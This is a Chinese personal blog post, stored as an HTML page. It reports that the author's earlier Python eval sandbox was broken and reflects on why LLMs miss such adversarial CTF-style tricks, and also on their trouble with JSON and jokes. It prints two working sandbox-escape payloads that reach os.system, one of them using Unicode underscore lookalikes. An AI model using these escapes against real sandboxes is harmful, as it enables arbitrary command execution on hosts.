@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>无用之用——或许LLM真的还不是AGI – est の 输入 输出和出入</title>
+<link rel="icon" href="https://est.im/favicon.svg">
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self' https://disqus.com https://player.bilibili.com https://www.youtube.com;">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="est の 输入 输出和出入 RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="无用之用——或许LLM真的还不是AGI" />
+
+    <link rel="canonical" href="https://blog.est.im/2026/stdin-08" />
+    <meta property="og:url" content="https://blog.est.im/2026/stdin-08">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="无用之用——或许LLM真的还不是AGI">
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    est の 输入 输出和出入
+  </a></h1>
+  <div class="hamburger-menu">
+    <button>
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://feeds.feedburner.com/initiative" class="hamburger-menu-overlay-link">RSS</a></li>
+      <li><a href="/about" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="/category" class="hamburger-menu-overlay-link">Category</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">无用之用——或许LLM真的还不是AGI</h2>
+    <p class="post-date">Posted <time datetime="2026-03-25T21:40:00+08:00">2026-03-25</time> | <span>stdin</span></p>
+  </header>
+
+  
+  <p>之前记录的 <a href="https://blog.est.im/2026/stdout-09">安全的Python3沙箱——eval</a> 被人破解了。</p>
+<pre><code class="language-python">[
+    c._﹍init﹍_._﹍globals﹍_[&quot;os&quot;].system(&quot;id&quot;)
+    for c in ()._﹍class﹍_._﹍bases﹍_[0]._﹍subclasses﹍_()
+    if c._﹍init﹍_._﹍class﹍_._﹍name﹍_ == &quot;function&quot;
+    and &quot;os&quot; in c._﹍init﹍_._﹍globals﹍_
+]
+</code></pre>
+<p>或</p>
+<pre><code class="language-python">(
+    L:=[None],
+    g:=(x.gi_frame.f_back.f_back.f_builtins for x in L),
+    L.clear(),
+    L.append(g),
+    bi:=g.send(None),
+    bi['_'+'_import_'+'_']('os').system('id')
+)
+</code></pre>
+<p>其实 opus-4.6-thinking 当时提到了类似思路，但可惜miss了一丁点。</p>
+<ul>
+<li>AI想到的unicode是 U+FF3F 失败了，这里的 ﹍是 U+FE4D成功了。</li>
+<li>AI考虑到 gi_frame  但是没能成功写完整。</li>
+</ul>
+<p>看到这里我不仅哑然，距离成功就差临门一脚那么一点，但是AI终究不是AGI。人类在钻研死劲上还是胜过AI的。</p>
+<p>AI会不会有一些根本性的模式限制呢？我猜现阶段就是它最不太适应的就是这种对抗性的CTF。</p>
+<p>pretrain有个 reward model，只预测出一个最恰当的token。RLHF也是高度按照人类喜好去pick一个标准答案的。但是有些任务不是这样的，是全局试错然后留意着，说不定以后从candidate做个奇妙的组合，加工发挥，就有大用。</p>
+<p>今年开篇第一篇也写过《<a href="https://blog.est.im/2026/stderr-01">LLM的弱点——不能很好的讲笑话</a>》，恰如 LLM产生随机数能力很弱。因为它真的不会去随便挑个角度开始讲笑话，但群众喜闻乐见的「冷笑话」就是这样，冷不丁来一个，笑死人。笑点很奇怪。</p>
+<p>LLM过度讨好，就发现不了这种。而且即便发现了也不会记录搜藏用在下一次。。</p>
+<p>CTF和讲笑话一样，没有最优解。恰好是偶然你从一个刁钻的角度入手，可能一开始很不起眼，但是你能解决问题</p>
+<p>A -&gt; B 死胡同<br />
+C -&gt; D 死胡同</p>
+<p>B+D居然能解决E。</p>
+<p>所以我感觉现阶段LLM是擅长「优化」类任务，把做到极致。但是搜集启发式的活儿，第一是它pretrain没这么教，第二是教了它也不会搜集，memory得靠外挂。</p>
+<p>或许人类以后的工作，狩猎式的活儿不用做了，可以去采集类的。如同 CTF奇怪路径某一天突然串通了可以构造一个 exploit，也如同多个违背预期结合可以构成一个笑话</p>
+<p>无用之用方为大用？哈哈哈</p>
+<hr />
+<p>又刷到这篇 <a href="https://blog.cloudflare.com/code-mode/">we've all been using MCP wrong</a></p>
+<p>我个人是有切身体会的。AI 其实对 JSON 这种格式掌握一点都不好，经常写出有语法错误的。我现在完全放弃用JSON跟AI交互了，都改为 markdown 段落章节形式了</p>
+<p>谁知道，AI居然不习惯JSON这样机械严格的东西，反而喜欢接近自然语言宽松的格式。</p>
+<p>Cloudflare博客也强调，与其教AI去调用MCP，不如让AI写对应的代码去调用MCP。AI更习惯写代码。这和Claude某些bash党的观点不谋而合，因为AI培训班就是大量代码和自然文本，JSON其实反而说得少，不习惯啊。</p>
+<p>从这个角度说，JSON都写不好的AI，还想什么AGI呢。</p>
+</article>
+
+<div class="comments">
+  <h2>Comments</h2>
+  <script type="text/javascript" defer src="https://c.est.im/req4cmt.js"></script>
+</div>    </main>
+
+
+  </body>
+
+</html>
